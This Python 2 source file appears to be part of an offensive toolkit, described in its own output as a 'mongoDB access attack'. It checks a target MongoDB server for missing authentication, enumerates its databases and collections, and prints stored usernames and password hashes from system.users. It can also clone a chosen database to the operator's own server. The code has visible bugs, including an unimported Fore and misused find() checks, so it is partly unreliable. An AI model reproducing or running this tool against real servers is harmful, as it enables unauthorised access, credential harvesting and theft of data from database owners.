# -*- coding: utf-8 -*-
# __author__: sixwhale
from Lib.setting import TAG_NO
from Lib.setting import TAG_YES
from Lib.common import printErrMsg
from Lib.common import printInfoMsg
from pymongo import MongoClient

def mgAttack(ip,port,myip,myport,clone_info=[0,None]):
    print '[*] mongoDB access attack'
    mongoOpen = False
    is_clone, clone_db = clone_info
    print '[*] Checking whether the crendentials are need.'
    needCreds = mongoScan(ip,port)
    if needCreds[0] == 0:
        conn = MongoClient(ip,port)
        print '[*] '+ip+':'+str(port)+' access with no crendential!'
        mongoOpen = True
    elif needCreds[0] == 1:
        print '[*] login required......'
        DBuser = raw_input(Fore.CYAN + 'Username: ')
        DBpwd = raw_input(Fore.CYAN + 'Password: ')
    elif needCreds[0] == 2:
        conn = MongoClient(ip,port)
        print '[*] access check failure. Testing will continute but will be unreliable.'
        mongoOpen = True
    elif needCreds[0] == 3:
        printErrMsg('[Error] couldn\'t connect to MongoDB server.')

    if mongoOpen == True:
        displayInfo(conn) #显示数据库信息
        displayDBS(conn) #列数据库 列集合
        if is_clone == 1 and clone_db != None:
            cloneDB(conn,myip,myport,clone_db,ip)

def displayInfo(conn):
    printInfoMsg('[+] Server Info:')
    print '    MongoDB Version:', conn.server_info()['version']
    print '    Debugs enabled:', str(conn.server_info()['debug'])
    print '    Platform:', str(conn.server_info()['bits']) + ' bits'
    print '\n'

def displayDBS(conn):
    try:
        printInfoMsg('[+] List of databases:')
        for db in conn.database_names():
            print '    %s' % db
        print '\n'
    except:
        printErrMsg('[Error] Couldn\'t list databases.')
    try:
        for dbname in conn.database_names():
            db = conn[dbname]
            printInfoMsg('[+] DBname: %s' % dbname)
            colls = db.collection_names(include_system_collections=False)
            printInfoMsg('[+] %s Collections:' % dbname)
            for coll in colls:
                print '    %s' % coll
            print '\n'

            if 'system.users' in db.collection_names():
                users = list(db.system.users.find())
                printInfoMsg('[+] Database User and Password hash:')
                try:
                    for x in range(0, len(users)):
                        print "    Username: " + users[x]['user']
                        print "    Hash: " + users[x]['pwd']
                        print "\n"
                except Exception, e:
                    printErrMsg('[Error] %s, couldn\'t list user or hash\n' % e)
                    continue
    except Exception, e:
        printErrMsg('[Error] %s, Couldn\'t list collections.\n' % e)

def mongoScan(ip,port):
    try:
        conn = MongoClient(ip,port)
        try:
            dbVersion = conn.server_info()['version']
            conn.close()
            return [0,dbVersion]
        except Exception, e:
            if str(e).find('need to login'):
                conn.close()
                return [1,None]
            else:
                return [2,None]
    except:
        return [3,None]

def cloneDB(conn,myip,myport,clone_db,ip):
    dbList = conn.database_names()
    if len(dbList) == 0:
        printErrMsg('[Error] couldn\'t get a list of databases to clone.')
    elif clone_db in dbList:
            try:
                dbNeedCreds = raw_input(Fore.CYAN + '[*] Does this Database require credentials.(y/n)?')
                myDBconn = MongoClient(myip,myport)
                if dbNeedCreds in TAG_NO:
                    myDBconn.copyDatabase(clone_db,clone_db+'_clone',ip)
                elif dbNeedCreds in TAG_YES:
                    user = raw_input(Fore.CYAN + 'Username: ')
                    pwd = raw_input(Fore.CYAN + 'Password: ')
                    myDBconn.copyDatabase(clone_db,clone_db+'clone',ip,user,pwd)
                else:
                    raw_input(Fore.CYAN + '[*] Invalid Selection. Press enter to continue!')
                    cloneDB(conn,myip,myport,clone_db,ip)
            except Exception, e:
                if str(e).find('Connection refused'):
                    printErrMsg('[Error] %s. Make sure that mongoDB has been installed or that mongoDB is opened on this computer.' % e)
                elif str(e).find('text search not enabled'):
                    printErrMsg('[Error] %s. Database copied, but text indexing was not enabled on the target.' % e)
                else:
                    printErrMsg('[Error] %s. Something went wrong.' % e)
